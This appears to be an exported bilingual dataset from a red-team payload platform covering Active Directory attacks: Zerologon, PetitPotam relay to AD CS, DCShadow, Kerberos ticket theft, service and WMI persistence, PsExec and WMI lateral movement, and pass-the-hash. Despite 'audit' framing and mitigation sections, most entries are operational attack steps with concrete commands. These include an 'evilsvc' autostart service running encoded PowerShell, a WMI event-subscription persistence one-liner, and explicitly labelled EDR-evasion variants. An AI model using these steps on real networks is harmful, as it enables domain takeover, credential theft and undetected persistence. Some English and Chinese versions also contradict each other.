vulnerability.zh: 根因是 MS-NRPC 使用 AES-CFB8 且 IV 固定为全零（CVE-2020-1472）：攻击者利用固定 IV 可计算出通过校验的 ClientCredential，从而伪造 NetrServerPasswordSet2 请求；未修补域控接受该请求后将自身机器账户密码置空，攻击者随即以空凭据完成 DRSUAPI 复制导出全量域哈希。
vulnerability.en: The root cause is MS-NRPC's NetrServerPasswordSet2 using a cryptographically forgeable all-zero IV and session key (CVE-2020-1472); an unpatched DC accepts the forged request and nulls its own machine-account password, after which the attacker performs DRSUAPI replication with empty credentials to export every domain hash.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 zerologon_tester 探测，输出 Success 即确认域控未修补；第 2 步运行 exploit 将域控机器账户密码置空；第 3 步用 secretsdump -no-pass 以空密码导出全部域哈希（含 krbtgt）；第 4 步必须运行 restore 脚本以原始哈希恢复域控密码，否则机器账户密码与目录记录不一致，安全通道与域复制将中断。全流程仅在书面授权环境执行。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 probes with zerologon_tester — Success output confirms the DC is unpatched; step 2 runs the exploit to null the DC machine-account password; step 3 exports all domain hashes (including krbtgt) with secretsdump -no-pass using empty credentials; step 4 must run the restore script to recover the DC password from the saved hash, or the DC loses AD synchronization. Execute the entire flow only in written-authorized environments. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 为全部域控安装 2020-08+ 安全更新并开启 Netlogon 强制模式拒绝脆弱连接，监控 5827-5831 Netlogon 拒绝事件；受影响环境升级后按两阶段轮换 krbtgt。修复后用第 1 步样例回归，tester 应报告不可利用。

prerequisites.zh: 确认 PetitPotam/EFSRPC 暴露审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PETITPOTAM_E_1 与蓝队日志；成功时转发到域控 LDAP 并获取 DC 机器证书。

title.zh: PetitPotam/EFSRPC 暴露审计校正命令 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PETITPOTAM_E_2 与蓝队日志；成功时域控向操作主机发起 NTLM 认证回调。

title.zh: PetitPotam/EFSRPC 暴露审计校正命令 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PETITPOTAM_E_3 与蓝队日志；成功时输出 SMB 签名配置，RequireSecuritySignature 为 True 表示 LDAP 转发受限。

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过对 EFSRPC(UUID e351) 调用的监控：改走 MS-RPRN 打印机路径触发认证；relay 端收到 NTLM 即成功。
description.en: Trigger via the MS-RPRN printer path to bypass EFSRPC UUID monitoring; NTLM arriving at the relay confirms success.

description.zh: 换用 MS-DFSNM 删除副本根路径强制出站认证；监听端收到认证请求即成功。
description.en: Coerce via the DFS-NM standby-root removal path instead; an auth request reaching the listener confirms success.

description.zh: 换用 MS-SRVS 共享枚举路径触发同样的 coerced auth；relay 捕获凭据即成功。
description.en: Coerce via the MS-SRVS share enumeration path; the relay capturing credentials confirms success.

title.zh: 架设 LDAP 与 ADCS 中继

description.zh: 启动 ntlmrelayx.py 指向 CA 的 Web 注册端点并启用 --adcs（证书服务与域控同机时 {CA_HOST} 即 {DC_HOST}）；服务就绪等待认证即搭好证书申请中继阵地。
description.en: Start ntlmrelayx.py -t ldap://DC --adcs --smb2support; the listener standing by completes the certificate-request relay position.

title.zh: 触发 EFSRPC 强制认证

description.zh: 运行 petitpotam.py 携带域凭据诱导目标回连操作机；中继端打印已认证账号即强制认证触发成功。
description.en: Run petitpotam.py with domain creds to force the target back to your host; the authenticated account printed on the relay confirms coercion.

title.en: Mint a certificate to entrench access

description.zh: 在中继端为被劫持账号申请 Base64 证书；证书不受密码轮换影响，可用其通过 PKINIT 申请 Kerberos 票据，长期维持该身份。
description.en: Request a Base64 certificate for the hijacked account on the relay; rotation-proof, it sustains the identity through Kerberos ticketing long-term.

title.zh: 摸排签名缺口扩大中继
title.en: Find more relay targets without signing

description.zh: 用 Get-SmbServerConfiguration 检查签名强制项；未强制签名的服务器清单即后续 SMB 中继的优先打击面。
description.en: Check enforcement fields with Get-SmbServerConfiguration; servers without mandatory signing are the preferred relay targets next.

overview.zh: PetitPotam/EFSRPC 暴露审计覆盖 EFSRPC 强制认证场景：针对未修补 EFSRPC 或 AD CS 未启用 EPA 的域环境，验证能否强制域控发起认证并中继获取机器证书。验证维度涵盖 ADCS 中继监听、PetitPotam 触发回调与 SMB 签名基线核对三类步骤。
overview.en: PetitPotam and EFSRPC Exposure Audit covers EFSRPC coercion: for domains with unpatched EFSRPC or ADCS endpoints lacking EPA, verify whether the DC can be forced to authenticate and relayed for machine certificates. Verification dimensions cover ADCS relay listening, PetitPotam callback triggering, and SMB signing baseline checks.

vulnerability.zh: 根因是 LSARPC/EFSRPC 接口可在未认证情况下触发目标机器向攻击者发起 NTLM 认证；AD CS Web 端点未要求 EPA 时，中继该认证即可为域控申请证书，随后以 Domain Controller 身份执行 DCSync 导出全量哈希。
vulnerability.en: The root cause is LSARPC/EFSRPC interfaces that make the target machine initiate NTLM authentication to the attacker without requiring authentication; while ADCS web endpoints do not require EPA, relaying that authentication enrolls a DC certificate, after which DCSync runs as the Domain Controller to export all hashes.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步启动 ntlmrelayx 指向 AD CS Web 注册端点（http://{CA_HOST}/certsrv，启用 --adcs）监听中继；第 2 步运行 petitpotam.py 指向操作主机与域控，域控向操作主机发起 NTLM 回调即确认强制认证生效，中继器随之取得 DC 机器证书；第 3 步用 Get-SmbServerConfiguration 核对 SMB 签名配置，RequireSecuritySignature 为 True 表示 SMB 中继受限（LDAP 中继需另行核对 LDAP 签名/通道绑定），作为中继面判定的对照基线。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 starts the relay with ntlmrelayx -t ldap://DC --adcs; step 2 runs petitpotam.py toward the operator host and the DC — an NTLM callback from the DC to the operator confirms coercion, and the relay obtains the DC machine certificate; step 3 reviews signing with Get-SmbServerConfiguration — RequireSecuritySignature True means LDAP relay is constrained, serving as a comparison baseline. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 为域控安装 EFSRPC 相关补丁并禁用匿名 EFSRPC 调用，AD CS 全部端点强制 EPA，启用 LDAP 签名与通道绑定；监控模板异常或主机名异常的证书申请。修复后用第 2 步样例回归，回调不再触发或中继被 EPA 拒绝。
mitigation.en: Install EFSRPC-related patches on DCs and disable anonymous EFSRPC calls, require EPA on all ADCS endpoints, and enable LDAP signing with channel binding; monitor certificate requests with abnormal templates or hostnames. After the fix, regress with the step 2 sample: callbacks must stop or the relay must be rejected by EPA.

attackChain.payload:
# mimikatz lsadump::dcshadow 属性推送参数（与上一步注册的服务器配合使用）
/object:{LAB_OBJECT_DN} /attribute:primaryGroupID /value:519

overview.zh: DCShadow 复制元数据检测审计覆盖恶意域控注册场景：针对持有域复制权限的测试主体，验证能否注册伪造域控并以复制流量推送任意目录属性修改。验证维度涵盖 primaryGroupID 修改注册暂存、/push 推送执行与 sidHistory 扩展注册三类。
overview.en: DCShadow Replication-Metadata Detection Audit covers rogue DC registration: for a test principal holding domain replication rights, verify whether a forged DC can be registered to push arbitrary directory attribute changes as replication traffic. vulnerability.zh: 根因是目录复制协议允许持有相应权限的主体注册为复制伙伴后直接推送属性变更，绕过常规修改路径的审计；primaryGroupID、sidHistory 等特权属性可被无声改写，痕迹集中在 4929/4930/4931 等复制事件。
vulnerability.en: The root cause is that the replication protocol lets principals with the relevant rights register as replication partners and push attribute changes directly, bypassing the audit of the normal modification path; privileged attributes such as primaryGroupID and sidHistory can be rewritten silently, leaving traces concentrated in 4929/4930/4931 replication events.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 lsadump::dcshadow /object /attribute:primaryGroupID /value:519 注册暂存对目标对象的修改，注册成功即确认链路可用；第 2 步用 /push 以复制流量推送暂存修改，DC 返回推送完成即确认属性改写落地；第 3 步追加 sidHistory 注册项演示任意属性扩展。执行前提是复制权限与 RPC 端口可达同时满足。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 stages the change with lsadump::dcshadow /object /attribute:primaryGroupID /value:519 — successful registration confirms the path; step 2 pushes the staged change as replication traffic with /push — the DC reporting completion confirms the attribute rewrite landed; step 3 appends a sidHistory staging entry to demonstrate arbitrary attribute extension. Prerequisites are replication rights plus RPC reachability. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 收紧复制目录变更与管理复制拓扑权限，实施分层管理；对 4929/4930/4931 恶意 DC 注册与推送事件及非域控来源的复制流量实时告警。修复后用第 1 步样例回归，伪造 DC 注册应被拒绝。
mitigation.en: Tighten replicate directory changes and manage replication topology rights with tiered administration; alert in real time on 4929/4930/4931 rogue-DC registration and push events plus replication traffic from non-DC sources. After the fix, regress with the step 1 sample: rogue DC registration must be denied.

description.zh: 离线读取域控 Kerberos 加密类型策略；含 0x3 或未禁 RC4 即 NoAuth 攻击面存在。

title.zh: Rubeus 强制 RC4 请求

description.zh: 以管理工具显式请求 RC4 票据替代专用 PoC；返回 rc4_hmac 票据即弱加密路径可用。
description.en: Explicitly request an RC4 ticket via an admin-style tool replacing dedicated PoCs; a returned rc4_hmac ticket confirms the weak path.

description.zh: 默认 NTLM(RC4) 预认证路径直接请求 TGT：与强制 AES 环境形成差异对照；成功收到 .ccache 即 RC4 路径开放。
description.en: Request a TGT via the default NTLM(RC4) preauth path as a differential control; a granted .ccache confirms the RC4 path is open.

title.zh: 直取管理员 Kerberos 票据

description.zh: 运行 NoAuth.py 以普通域用户指定 target administrator；输出 administrator.ccache 即绕过校验拿到高权限票据。
description.en: Run NoAuth.py as a normal user with target administrator; the administrator.ccache output is a privileged ticket obtained by bypassing validation.

description.zh: 重复运行 NoAuth.py 交叉验证；票据稳定生成且域控接受续期即该利用路径可靠，可投入批量使用。
description.en: Run NoAuth.py again to cross-check; stable ticket generation with the DC accepting renewals proves the path reliable for batch use.

title.en: Import the ticket to take over

description.en: Set KRB5CCNAME to the ccache and access domain services with Kerberos tooling; passing as administrator completes the takeover.

overview.zh: Kerberos NoAuth 版本与加密边界审计覆盖无预认证利用场景：针对存在相关 CVE 且未修补的实现版本，验证能否对目标账户完成无预认证攻击并取得可用票据缓存。验证维度涵盖利用执行、可复现性核对与票据环境变量装载三步。
overview.en: Kerberos NoAuth Version and Encryption-Boundary Audit covers pre-authentication-free exploitation: for implementation versions carrying the relevant CVE and lacking patches, verify whether the target account can be attacked without pre-authentication and a usable ticket cache obtained. Verification dimensions cover execution, reproducibility checks, and ticket environment loading.

vulnerability.zh: 根因与具体实现版本绑定（须先确认对应 CVE 与补丁状态）：目标实现在缺少预认证校验的路径上允许攻击者获取目标账户的 Kerberos 票据材料；RC4 等弱加密类型未禁用时，取得材料即可离线换取可用票据。
vulnerability.en: The root cause is bound to the specific implementation version (confirm the CVE and patch state first): the implementation permits obtaining the target account's Kerberos ticket material along a path lacking pre-authentication validation; with weak encryption types such as RC4 still enabled, the material converts offline into usable tickets.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 NoAuth.py 指定目标账户，输出 ccache 路径即确认利用成功；第 2 步重复执行同样命令，输出一致即确认可复现；第 3 步用 export KRB5CCNAME 指向生成的 ccache 并以 klist 读取，确认票据可被标准工具装载使用。执行前先核对域控版本与补丁状态以绑定结论。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 runs NoAuth.py against the target account — a printed ccache path confirms exploitation; step 2 repeats the same command — identical output confirms reproducibility; step 3 points KRB5CCNAME at the generated ccache and reads it with klist, confirming the ticket loads in standard tools. Bind conclusions by checking DC version and patch state first. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 按实现方的 CVE 公告安装补丁或升级版本，禁用弱加密类型并强制 AES Kerberos，监控异常 TGT 请求模式与失败预认证。修复后用第 1 步样例回归，利用应失败或产出的票据不可用。
mitigation.en: Install patches or upgrade per the vendor's CVE advisory, disable weak encryption types and enforce AES Kerberos, and monitor anomalous TGT request patterns and failed pre-authentication. After the fix, regress with the step 1 sample: exploitation must fail or yield unusable tickets.

title.zh: 现有服务 ImagePath 劫持

description.zh: 不新建对象只改既有服务路径：绕过新增服务审计；服务重启后执行载荷即成功。

description.zh: 系统风格长名与显示名降低运维目视告警；服务列表出现且 start= auto 即成功。
description.en: A system-style long name lowers visual triage alerts; the service listed with automatic start confirms success.

description.zh: 把要常驻执行的命令编码为 Base64 形态并验证可独立运行；确定为服务 binPath 的最终载荷，避免命令行特殊字符引发解析问题。
description.en: Base64-encode the resident command and verify it executes standalone; fixing the final binPath payload early avoids parsing surprises in service control.

attackChain.payload: sc create evilsvc binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto

description.zh: 用 sc create 注册 auto 启动类型的服务，binPath 指向 Base64 编码命令；服务创建成功即写入系统级自启配置，等待开机加载。
description.en: Register an auto-start service with sc create whose binPath runs a Base64 command; creation writes the system-level autostart entry awaiting boot.

attackChain.payload: sc create evilsvc binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto

title.en: Start the service to verify firing

description.zh: 用 sc start 启动服务；载荷命令执行即确认持久化生效（cmd /c 包装的 binPath 不维持 RUNNING，SCM 报终止属预期），系统重启后仍会自动加载执行。
description.en: Start it with sc start; RUNNING status plus the encoded command executing proves persistence that survives reboots.

overview.zh: 该 Payload 覆盖服务持久化配置审计场景，检验自启服务创建与启动触发的完整链路。验证维度含 Base64 载荷服务注册与启动执行两步，对应第 1 至第 2 步。
overview.en: This payload covers service-persistence configuration auditing, testing the full chain of autostart service creation and launch triggering. Validation covers registering a Base64-payload service and start execution, mapped to steps 1 and 2.

vulnerability.zh: 根因在于服务注册默认要求管理员但常被滥用为合法变更：指向脚本解释器的 binPath 获得开机自启与失败重启的双重触发，隐蔽性高于启动目录。
vulnerability.en: The root cause is service registration requiring administrator yet frequently abused as legitimate change: a binPath pointing at script interpreters gains both boot-start and failure-restart triggers, hiding better than startup folders.

exploitation.zh: 第 1 步用 sc create 注册自启服务 evilsvc，binPath 指向 Base64 解码命令，qc 回读确认创建成功；第 2 步以 sc start 触发执行，载荷命令执行即确认持久化链路完整（cmd /c 包装的服务不会维持 RUNNING，以载荷执行痕迹为准）。以执行痕迹与开机自动加载为成功判据。占位符在全局变量菜单替换；测试后 sc delete 清理服务。
exploitation.en: In step 1, register autostart service evilsvc with sc create, pointing binPath at a Base64-decoded command, and confirm creation via qc read-back. In step 2, trigger execution with sc start; RUNNING status plus payload execution confirms the persistence chain. Judge success by execution traces and service state. Replace placeholders via the global variables menu; clean up with sc delete after testing.

mitigation.zh: 对服务创建与配置变更启用事件审计（7045、7040）并基线比对服务清单，约束管理员执行来源。修复后重放第 1 步，注册应即时告警并进入审批流程。
mitigation.en: Enable event auditing for service creation and changes (7045, 7040), diff service inventories against baselines, and constrain administrator execution sources. After the fix, replay step 1: registration should alert instantly and enter approval workflow.

title.en: PsExec and SMB Remote-Service Boundary Validation Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_4 与蓝队日志；成功时 PsExec 连接目标返回 cmd 交互界面，且临时服务创建后被清理。

explanation.en: Describes how the parameter segment "-u" participates in this validation command.
Describes how the parameter segment "-p" participates in this validation command.

analysis.zh: PsExec/SMB 远程服务边界验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: PsExec and SMB Remote-Service Boundary Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过对默认服务名（如 XYZ/BTOBUTO/随机大写串）的 EDR 特征：伪装为系统管理风格服务名。成功判据：半交互 shell 建立且服务名不在检测名单。
description.en: Evades EDR signatures on default random-caps service names by masquerading as a sysadmin-style name. Success: semi-interactive shell establishes with a service name off detection lists.

description.zh: 绕过 admin$ 二进制落盘检测（PSEXESVC.exe 落盘告警）：SMBExec 经服务批处理执行不落盘。成功判据：shell 可用且目标无新 EXE 落盘。
description.en: Evades admin$ binary drop detection (PSEXESVC.exe landing alerts) since SMBExec executes via service batches without dropping a binary. Success: shell works and no new EXE lands on the target.

title.zh: 原生 sc.exe 组合规避变体

wafBypass.command: sc \\{LAB_HOST} create W32TimeUpdate binPath= "cmd /c whoami > C:\Windows\Temp\o.txt" && sc \\{LAB_HOST} start W32TimeUpdate && sc \\{LAB_HOST} delete W32TimeUpdate

description.zh: 绕过 impacket 脚本流量指纹：全程原生 sc.exe 创建/启动/删除，动作分散于三个低噪操作。成功判据：服务启动成功且 o.txt 生成。
description.en: Evades impacket script traffic fingerprints by doing everything with native sc.exe create/start/delete spread across three low-noise operations. Success: service starts and o.txt appears.

title.zh: 口令登录建立远程执行

description.zh: 用 psexec.py 以域账号口令登录目标；返回 SYSTEM 交互 shell 即远程服务执行通道打通，可执行任意命令。
description.en: Log into the target with psexec.py using domain credentials; a SYSTEM interactive shell means the remote service execution channel is open.

description.zh: 改用 -hashes 传入 NTLM 哈希登录同批主机；无需明文口令拿到 shell 即哈希可复用，覆盖只有哈希的场景。
description.en: Switch to -hashes with the NTLM hash for the same fleet; shells without the plaintext password prove hash reuse and cover hash-only situations.

title.zh: 定向执行命令收割结果
title.en: Run targeted commands to harvest results

description.zh: 在登录命令后追加 whoami 等指令；回显 SYSTEM 上下文即确认执行身份，可批量替换为凭据收集与侦察命令。
description.en: Append commands like whoami after the login; a SYSTEM context echoed back confirms the execution identity and can be swapped for credential dump and recon commands.

title.zh: 原生 PsExec 落地横向

description.zh: 在跳板机用 PsExec.exe \目标 -u 域\账号 -p 口令 启动 cmd.exe；新 shell 属于目标主机即完成原生工具横向，动作仅表现为服务安装。
description.en: From the pivot host run PsExec.exe \\target -u domain\user -p password to launch cmd.exe; the new shell belonging to the target completes native lateral movement, visible only as service installation.

overview.zh: PsExec/SMB 远程服务边界验证覆盖 SMB 远程执行场景：针对拿到有效凭据或 NTLM 哈希的测试主体，验证能否经 445 端口在目标主机创建服务并执行命令。验证维度涵盖明文密码、哈希传递、远程单命令执行与原生 PsExec 四种入口。
overview.en: PsExec/SMB Remote-Service Boundary Validation covers SMB remote execution: for a test principal holding valid credentials or an NTLM hash, verify whether a service can be created on the target via port 445 to execute commands. Verification dimensions cover plaintext password, pass-the-hash, single remote command, and native PsExec entries.

vulnerability.zh: 根因是 SMB 服务与管理共享（ADMIN$）允许特权主体远程创建并启动服务，服务进程继承 SYSTEM 权限；弱口令、NTLM 哈希泄露或本地管理员凭据复用，使攻击者绕过交互式登录直接在目标侧执行任意命令。
vulnerability.en: The root cause is that the SMB service and the ADMIN$ share let privileged principals remotely create and start services whose processes inherit SYSTEM; weak passwords, leaked NTLM hashes, or reused local-admin credentials let an attacker execute arbitrary commands on the target without interactive logon.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用实验账号密码建立 psexec 交互 shell，whoami 显示 SYSTEM（nt authority\system）上下文且目标侧出现 7045 服务创建事件即确认成功；第 2 步改用 -hashes 以 NTLM 哈希认证，目标记录 4624 NTLM 网络登录即确认哈希可用；第 3 步远程执行 whoami 验证命令回传；第 4 步用原生 PsExec.exe 复现并确认临时服务创建后被清理。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 establishes an interactive psexec shell with the lab account password — whoami returning the target context plus a 7045 service-creation event on the target confirms success; step 2 switches to -hashes for NTLM authentication — a 4624 NTLM logon recorded on the target confirms the hash works; step 3 executes whoami remotely to verify command return; step 4 replays with native PsExec.exe and confirms the temporary service is cleaned up. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 限制 445 端口仅管理网段可达，启用 SMB 签名与 EPA，实施本地管理员隔离并用 LAPS 轮换本机管理员密码，建立分层管理账号；对 7045 服务创建与 4624 异常登录实时告警。修复后用第 1、2 步样例回归，远程服务创建应被拒绝并触发告警。
mitigation.en: Restrict port 445 to the management segment, enable SMB signing and EPA, enforce local administrator isolation with LAPS rotation, and adopt tiered admin accounts; alert in real time on 7045 service creation and anomalous 4624 logons. After the fix, regress with the step 1 and step 2 samples: remote service creation must be denied and raise an alert.

description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_3 with blue-team logs; WMI authentication with the NTLM hash yielding an interactive shell confirms success.

description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_4 with blue-team logs; Invoke-WmiMethod returning ReturnValue 0 with a new process on the target confirms success.

analysis.zh: WMI 远程管理授权验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: WMI Remote-Management Authorization Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 wmic.exe 弃用遥测与进程链检测（wmic.exe→子进程特征）：用 PowerShell CIM 直连 WMI 服务。成功判据：进程创建成功且父进程非 wmic.exe。
description.en: Evades deprecated wmic.exe telemetry and process-chain detection (wmic.exe→child signature) by using PowerShell CIM to reach the WMI service directly. Success: process creation succeeds with a non-wmic parent.

title.zh: 事件订阅持久化规避变体

wafBypass.command: $filter=Set-CimInstance -Namespace root\subscription -ClassName __EventFilter -Arguments @{Name='SysHealth';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer=Set-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Arguments @{Name='SysHealth';CommandLineTemplate='cmd /c whoami > C:\Windows\Temp\w.log'}; Set-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}

description.zh: 绕过一次性 wmiexec 会话的 4648/进程创建告警：改用事件订阅延迟触发，无即时进程链关联。成功判据：60 秒内 w.log 生成且无即时父进程关联。
description.en: Evades one-shot wmiexec session alerts (4648/process creation) by switching to an event subscription that fires later with no immediate parent correlation. Success: w.log appears within 60s without an immediate parent chain.

title.zh: 共享输出回读规避变体

description.zh: 绕过 WMI 输出通道监控：结果重定向共享，规避 stdout 编码回传特征。成功判据：w.txt 含执行身份。
description.en: Evades WMI output-channel monitoring by redirecting results to a share instead of the encoded stdout return path. Success: w.txt contains the execution identity.

description.zh: 用 wmic /node:目标 process call create 启动回连命令；目标进程列表出现新进程即 WMI 远程执行可用且无文件落地。
description.en: Use wmic /node:target process call create to start a callback command; the new process appearing on the target shows WMI remote execution works without file drops.

title.en: Open an interactive channel with wmiexec

description.zh: 运行 wmiexec.py 以口令登录目标；返回管理员级半交互 shell 即建立稳定横向通道，可连续执行命令。
description.en: Run wmiexec.py with credentials; an admin-level semi-interactive shell establishes a stable lateral channel for continuous commands.

description.zh: 以 -hashes 方式重跑 wmiexec；同样拿到 shell 即 NTLM 哈希在 WMI 通道有效，可横向到仅握有哈希的主机。
description.en: Re-run wmiexec with -hashes; the same shell proves the NTLM hash works over WMI, extending reach to hash-only hosts.

title.en: Fan out with native PowerShell WMI

description.zh: 用 Invoke-WmiMethod 调 Win32_Process.Create 在域内批量下发命令；各目标返回 ProcessId 即完成无第三方二进制的批量横向。
description.en: Use Invoke-WmiMethod with Win32_Process.Create to fan commands across the domain; ProcessId returns from each target complete tool-free batch execution.

overview.zh: WMI 远程管理授权验证覆盖 DCOM/WMI 远程执行场景：针对持有凭据或哈希的测试主体，验证能否经 135 端口调用 Win32_Process 在目标创建进程。验证维度涵盖 wmic 单命令、wmiexec 交互 shell、哈希传递与 PowerShell 原生调用四种路径。
overview.en: WMI Remote-Management Authorization Validation covers DCOM/WMI remote execution: for a test principal holding credentials or a hash, verify whether Win32_Process can be invoked over port 135 to create a process on the target. Verification dimensions cover single-command wmic, an interactive wmiexec shell, pass-the-hash, and native PowerShell invocation.

vulnerability.zh: 根因是 WMI/DCOM 默认允许管理员组主体远程调用 Win32_Process.Create；口令弱化或哈希泄露后，攻击者无需向目标落盘任何工具即可拉起进程，行为混入正常 WMI 活动，检测依赖 4688 进程与 5857 WMI 活动事件关联。
vulnerability.en: The root cause is that WMI/DCOM by default lets administrators invoke Win32_Process.Create remotely; with weak passwords or leaked hashes, an attacker launches processes without dropping any tool on the target, and the activity blends into normal WMI traffic, making detection dependent on correlating 4688 process events with 5857 WMI activity.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 wmic 远程创建 cmd /c whoami 进程，返回 ReturnValue 0 与 ProcessId（命令输出需转存文件或共享取回）且目标侧出现 4688/5857 事件即确认成功；第 2 步进入 wmiexec 交互 shell 验证持续控制能力；第 3 步改用 -hashes 以 NTLM 哈希完成认证再取 shell；第 4 步先以 $cred = Get-Credential 构造凭据对象，再用 Invoke-WmiMethod 复现，ReturnValue 0 且目标出现新进程即确认。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 remotely creates a cmd /c whoami process with wmic — returned hostname output plus 4688/5857 events on the target confirms success; step 2 enters an interactive wmiexec shell to verify sustained control; step 3 switches to -hashes to authenticate with the NTLM hash and obtain a shell; step 4 replays with Invoke-WmiMethod — ReturnValue 0 plus a new process on the target confirms. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 将 WMI/DCOM 远程访问限制到管理网段与跳板机，收紧 WMI 命名空间与 DCOM 激活权限，禁用不需要的远程 WMI 功能；监控 Win32_Process.Create 调用与 5857/4688 事件。修复后用第 1、4 步样例回归，远程进程创建应返回拒绝错误。
mitigation.en: Restrict WMI/DCOM remote access to the management segment and jump hosts, tighten WMI namespace and DCOM launch permissions, and disable unnecessary remote WMI features; monitor Win32_Process.Create calls and 5857/4688 events. After the fix, regress with the step 1 and step 4 samples: remote process creation must return an access-denied error.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_PASS_THE_HASH_E_3 与蓝队日志；成功时 sekurlsa::pth 启动携带注入凭据的新进程并可访问域资源。

title.zh: NTLM Hash 登录防护验证校正命令 4
title.en: NTLM Hash Logon Protection Validation Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_PASS_THE_HASH_E_4 与蓝队日志；成功时 Invoke-SMBClient 以哈希列出目标共享内容。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_PASS_THE_HASH_E_4 with blue-team logs; Invoke-SMBClient listing target share contents with the hash confirms success.

analysis.zh: NTLM Hash 登录防护验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTLM Hash Logon Protection Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 impacket psexec.py 的 Python 流量指纹与二进制落盘：纯 PowerShell 内存态 SMB 客户端枚举。成功判据：返回共享列表且无新进程落盘。
description.en: Evades impacket psexec.py Python traffic fingerprints and binary drops by enumerating via a pure PowerShell in-memory SMB client. Success: share list returns with no new binaries landed.

description.zh: 绕过执行类告警（服务创建/进程启动）：先用哈希仅做共享枚举验证可用性，不触发载荷执行。成功判据：返回 [+] 认证成功与共享清单。
description.en: Evades execution alerts (service creation/process start) by validating the hash via share enumeration only, with no payload execution. Success: returns [+] access granted plus the share list.

description.zh: 绕过 NTLM 中继检测与 NTLM 事件告警：先把哈希换成 Kerberos TGT 再访问，流量呈现为标准 Kerberos。成功判据：dir 列出共享且网络流量为 Kerberos。
description.en: Evades NTLM relay detection and NTLM event alerts by exchanging the hash for a Kerberos TGT first so traffic looks like standard Kerberos. Success: dir lists the share with Kerberos traffic only.

